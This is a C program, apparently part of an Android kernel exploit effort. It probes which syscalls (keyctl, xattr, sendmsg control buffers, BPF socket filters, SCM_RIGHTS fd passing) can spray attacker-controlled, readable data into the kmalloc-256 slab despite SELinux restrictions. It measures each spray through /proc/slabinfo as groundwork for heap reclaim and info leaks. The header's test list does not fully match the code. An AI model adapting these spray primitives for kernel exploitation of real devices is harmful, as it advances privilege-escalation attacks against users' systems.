/*
 * reclaim_test.c — Test which kmalloc-256 reclaim primitives work from shell
 *
 * msg_msg blocked by SELinux (Permission denied on msgget).
 * Need to find alternatives that:
 *   1. Allocate controlled data in kmalloc-256
 *   2. Can be read back (for info leak)
 *   3. Allowed by SELinux for shell domain (u:r:shell:s0)
 *
 * Candidates:
 *   T1: keyctl (add_key + keyctl_read)
 *   T2: xattr (setxattr on /data/local/tmp file)
 *   T3: sendmsg cmsg control buffer (blocking sendmsg)
 *   T4: POSIX mqueue (mq_open + mq_send/recv)
 *   T5: BPF filter (SO_ATTACH_FILTER) — no readback but confirmed working
 *   T6: pipe splice — kernel pipe_buffer allocation
 *   T7: inotify — event buffer allocation
 *
 * Build: .\qemu\build-arm.bat src\reclaim_test.c reclaim_test
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/xattr.h>
#include <sys/wait.h>
#include <unistd.h>

/* keyctl syscall numbers for ARM */
#ifndef __NR_add_key
#define __NR_add_key 309
#endif
#ifndef __NR_keyctl
#define __NR_keyctl 311
#endif
#define KEYCTL_READ 11
#define KEYCTL_REVOKE 3
#define KEYCTL_UNLINK 9
#define KEY_SPEC_PROCESS_KEYRING -2

static long k_add_key(const char *type, const char *desc,
                      const void *payload, size_t plen, int keyring) {
    return syscall(__NR_add_key, type, desc, payload, plen, keyring);
}

static long k_keyctl_read(int key_id, char *buf, size_t buflen) {
    return syscall(__NR_keyctl, KEYCTL_READ, key_id, buf, buflen);
}

static long k_keyctl_revoke(int key_id) {
    return syscall(__NR_keyctl, KEYCTL_REVOKE, key_id);
}

static void read_slab(const char *cache, long *out) {
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[512];
    *out = -1;
    if (!f) return;
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, cache, strlen(cache)) == 0 &&
            line[strlen(cache)] == ' ') {
            sscanf(line + strlen(cache) + 1, "%ld", out);
            break;
        }
    }
    fclose(f);
}

/* ========== T1: keyctl (add_key + read) ========== */
static void test_keyctl(void) {
    printf("\n=== T1: keyctl (add_key + keyctl_read) ===\n");
    fflush(stdout);

    /* Try to add a key with 200-byte payload → kmalloc-256? */
    char payload[200];
    memset(payload, 'K', sizeof(payload));

    long k256_before, k256_after;
    read_slab("kmalloc-256", &k256_before);

    long key = k_add_key("user", "test_key", payload, sizeof(payload),
                          KEY_SPEC_PROCESS_KEYRING);
    if (key < 0) {
        printf("  add_key: errno=%d (%s)\n", errno, strerror(errno));
        if (errno == EACCES || errno == EPERM)
            printf("  ✗ BLOCKED by SELinux/permissions\n");
        return;
    }
    printf("  add_key OK: key_id=%ld\n", key);

    read_slab("kmalloc-256", &k256_after);
    printf("  kmalloc-256: %ld → %ld (delta=%+ld)\n",
           k256_before, k256_after, k256_after - k256_before);

    /* Try to read back */
    char rbuf[256];
    memset(rbuf, 0, sizeof(rbuf));
    long rlen = k_keyctl_read(key, rbuf, sizeof(rbuf));
    if (rlen < 0) {
        printf("  keyctl_read: errno=%d (%s)\n", errno, strerror(errno));
    } else {
        printf("  keyctl_read: %ld bytes, match=%s\n", rlen,
               memcmp(rbuf, payload, rlen) == 0 ? "YES" : "NO");
        printf("  ✓ KEYCTL WORKS! Controlled data in kmalloc, readable!\n");
    }

    /* Try multiple keys for spray */
    long k256_spray;
    read_slab("kmalloc-256", &k256_before);
    long keys[50];
    int nkeys = 0;
    for (int i = 0; i < 50; i++) {
        char desc[32];
        snprintf(desc, sizeof(desc), "spray_%d", i);
        keys[i] = k_add_key("user", desc, payload, sizeof(payload),
                             KEY_SPEC_PROCESS_KEYRING);
        if (keys[i] >= 0) nkeys++;
        else break;
    }
    read_slab("kmalloc-256", &k256_after);
    printf("  Spray: %d keys, k256 delta=%+ld (%.1f per key)\n",
           nkeys, k256_after - k256_before,
           nkeys > 0 ? (double)(k256_after - k256_before) / nkeys : 0);

    /* Cleanup */
    for (int i = 0; i < nkeys; i++)
        k_keyctl_revoke(keys[i]);
    k_keyctl_revoke(key);
}

/* ========== T2: xattr ========== */
static void test_xattr(void) {
    printf("\n=== T2: setxattr / getxattr ===\n");
    fflush(stdout);

    const char *path = "/data/local/tmp/.xattr_test";
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) { perror("  create file"); return; }
    write(fd, "x", 1);
    close(fd);

    char val[200];
    memset(val, 'X', sizeof(val));

    if (setxattr(path, "user.test", val, sizeof(val), 0) < 0) {
        printf("  setxattr: errno=%d (%s)\n", errno, strerror(errno));
        if (errno == ENOTSUP)
            printf("  ✗ Filesystem doesn't support xattr\n");
        else if (errno == EACCES || errno == EPERM)
            printf("  ✗ BLOCKED by SELinux/permissions\n");
    } else {
        printf("  setxattr OK\n");

        char rbuf[256];
        ssize_t rlen = getxattr(path, "user.test", rbuf, sizeof(rbuf));
        if (rlen > 0) {
            printf("  getxattr: %zd bytes, match=%s\n", rlen,
                   memcmp(rbuf, val, rlen) == 0 ? "YES" : "NO");
            printf("  ✓ XATTR WORKS!\n");
        } else {
            printf("  getxattr: errno=%d (%s)\n", errno, strerror(errno));
        }
    }
    unlink(path);
}

/* ========== T3: sendmsg cmsg ========== */
static void test_sendmsg_cmsg(void) {
    printf("\n=== T3: sendmsg cmsg control buffer ===\n");
    fflush(stdout);

    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
        printf("  socketpair: errno=%d (%s)\n", errno, strerror(errno));
        return;
    }

    /* Send with a large cmsg buffer (200 bytes) → kmalloc-256? */
    char cmsg_buf[200];
    memset(cmsg_buf, 'C', sizeof(cmsg_buf));
    /* Make it look like a valid cmsg header */
    struct cmsghdr *cmsg = (struct cmsghdr *)cmsg_buf;
    cmsg->cmsg_len = sizeof(cmsg_buf);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = 0xFF; /* invalid type, but kernel still allocates */

    char data[] = "hello";
    struct iovec iov = { .iov_base = data, .iov_len = sizeof(data) };
    struct msghdr msg = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = cmsg_buf,
        .msg_controllen = sizeof(cmsg_buf),
    };

    long k256_before, k256_after;
    read_slab("kmalloc-256", &k256_before);

    ssize_t ret = sendmsg(sv[0], &msg, 0);
    if (ret < 0) {
        printf("  sendmsg: errno=%d (%s)\n", errno, strerror(errno));
    } else {
        printf("  sendmsg: sent %zd bytes\n", ret);
    }

    read_slab("kmalloc-256", &k256_after);
    printf("  kmalloc-256 delta: %+ld\n", k256_after - k256_before);
    printf("  Note: cmsg ctl_buf is TRANSIENT (freed after sendmsg)\n");

    close(sv[0]);
    close(sv[1]);
}

/* ========== T4: POSIX mqueue ========== */
static void test_mqueue(void) {
    printf("\n=== T4: POSIX message queue ===\n");
    fflush(stdout);

    /* Try to open a POSIX message queue */
    /* mq_open might not be available via syscall easily on ARM */
    int fd = open("/dev/mqueue", O_RDONLY);
    if (fd < 0) {
        printf("  /dev/mqueue: errno=%d (%s)\n", errno, strerror(errno));
        printf("  Trying mq_open syscall...\n");
    } else {
        printf("  /dev/mqueue exists!\n");
        close(fd);
    }

    /* Try SysV message queue with IPC_PRIVATE (already failed in T3 of msgmsg test) */
    printf("  Note: SysV msgget already confirmed BLOCKED\n");
}

/* ========== T5: BPF filter slab confirmation ========== */
static void test_bpf_slab(void) {
    printf("\n=== T5: BPF filter (SO_ATTACH_FILTER) slab check ===\n");
    fflush(stdout);

    long k256_before, k256_after;
    read_slab("kmalloc-256", &k256_before);

    /* Create 50 sockets with BPF filters (26 instructions each) */
    int socks[50];
    int created = 0;
    for (int i = 0; i < 50; i++) {
        socks[i] = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (socks[i] < 0) break;

        /* 26 BPF instructions → 26*8 + 20 header = 228 → kmalloc-256 */
        struct sock_filter insns[26];
        for (int j = 0; j < 25; j++) {
            /* BPF_LD_IMM 0 (harmless no-op) */
            insns[j].code = BPF_LD | BPF_W | BPF_IMM;
            insns[j].jt = 0;
            insns[j].jf = 0;
            insns[j].k = 0x41414141 + j; /* controlled data */
        }
        /* Last instruction: return accept */
        insns[25].code = BPF_RET | BPF_K;
        insns[25].jt = 0;
        insns[25].jf = 0;
        insns[25].k = 0xFFFF; /* accept */

        struct sock_fprog prog = { .len = 26, .filter = insns };
        if (setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                       &prog, sizeof(prog)) < 0) {
            close(socks[i]);
            socks[i] = -1;
            continue;
        }
        created++;
    }

    read_slab("kmalloc-256", &k256_after);
    printf("  Created %d BPF filters (26 insns each)\n", created);
    printf("  kmalloc-256: %ld → %ld (delta=%+ld, %.1f per filter)\n",
           k256_before, k256_after, k256_after - k256_before,
           created > 0 ? (double)(k256_after - k256_before) / created : 0);

    for (int i = 0; i < 50; i++)
        if (socks[i] >= 0) close(socks[i]);
}

/* ========== T6: SCM_RIGHTS fd passing ========== */
static void test_scm_rights(void) {
    printf("\n=== T6: SCM_RIGHTS fd passing (scm_fp_list) ===\n");
    fflush(stdout);

    int sv[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) {
        printf("  socketpair: errno=%d (%s)\n", errno, strerror(errno));
        return;
    }

    /* Pass 60 fds → scm_fp_list size = 8 + 60*4 = 248 → kmalloc-256 */
    int fds[60];
    for (int i = 0; i < 60; i++)
        fds[i] = dup(0); /* dup stdin 60 times */

    char cmsg_buf[CMSG_SPACE(60 * sizeof(int))];
    memset(cmsg_buf, 0, sizeof(cmsg_buf));
    struct cmsghdr *cmsg = (struct cmsghdr *)cmsg_buf;
    cmsg->cmsg_len = CMSG_LEN(60 * sizeof(int));
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    memcpy(CMSG_DATA(cmsg), fds, 60 * sizeof(int));

    char data = 'R';
    struct iovec iov = { .iov_base = &data, .iov_len = 1 };
    struct msghdr msg = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = cmsg_buf,
        .msg_controllen = cmsg->cmsg_len,
    };

    long k256_before, k256_after;
    read_slab("kmalloc-256", &k256_before);

    ssize_t ret = sendmsg(sv[0], &msg, 0);
    if (ret < 0) {
        printf("  sendmsg SCM_RIGHTS 60 fds: errno=%d (%s)\n",
               errno, strerror(errno));
    } else {
        printf("  sendmsg SCM_RIGHTS 60 fds: OK (%zd bytes)\n", ret);
    }

    read_slab("kmalloc-256", &k256_after);
    printf("  kmalloc-256 delta: %+ld\n", k256_after - k256_before);

    /* The scm_fp_list persists until recvmsg */
    /* Try receiving to free */
    char r_cmsg_buf[CMSG_SPACE(60 * sizeof(int))];
    char r_data;
    struct iovec r_iov = { .iov_base = &r_data, .iov_len = 1 };
    struct msghdr r_msg = {
        .msg_iov = &r_iov,
        .msg_iovlen = 1,
        .msg_control = r_cmsg_buf,
        .msg_controllen = sizeof(r_cmsg_buf),
    };

    ret = recvmsg(sv[1], &r_msg, 0);
    if (ret >= 0) {
        long k256_recv;
        read_slab("kmalloc-256", &k256_recv);
        printf("  After recvmsg: k256 delta from peak: %+ld\n",
               k256_recv - k256_after);
    }

    for (int i = 0; i < 60; i++) close(fds[i]);
    close(sv[0]); close(sv[1]);
}

/* ========== MAIN ========== */

int main(void) {
    printf("=== Reclaim Primitive Test (kmalloc-256 from shell) ===\n");
    printf("PID=%d UID=%d\n", getpid(), getuid());

    struct { const char *name; void (*func)(void); } tests[] = {
        { "keyctl", test_keyctl },
        { "xattr", test_xattr },
        { "sendmsg cmsg", test_sendmsg_cmsg },
        { "POSIX mqueue", test_mqueue },
        { "BPF filter", test_bpf_slab },
        { "SCM_RIGHTS", test_scm_rights },
        { NULL, NULL }
    };

    for (int i = 0; tests[i].name; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(10);
            tests[i].func();
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            printf("*** %s CRASHED sig=%d ***\n", tests[i].name, WTERMSIG(status));
    }

    printf("\n=== Summary ===\n");
    printf("Need: kmalloc-256, user-controlled, readable, SELinux-allowed\n");
    return 0;
}
